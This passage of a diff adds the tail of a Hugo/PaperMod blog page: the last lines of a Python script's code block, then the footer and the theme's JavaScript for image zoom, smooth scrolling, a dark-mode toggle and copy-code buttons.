+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># r.interactive()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://leo1.cc:5555/">leo_something</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+    const images = Array.from(document.querySelectorAll(".post-content img"));
+    images.forEach(img => {
+        mediumZoom(img, {
+            margin: 0,  
+            scrollOffset: 40,  
+            container: null,  
+            template: null,  
+            background: 'rgba(0, 0, 0, 0.8)'
+        });
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
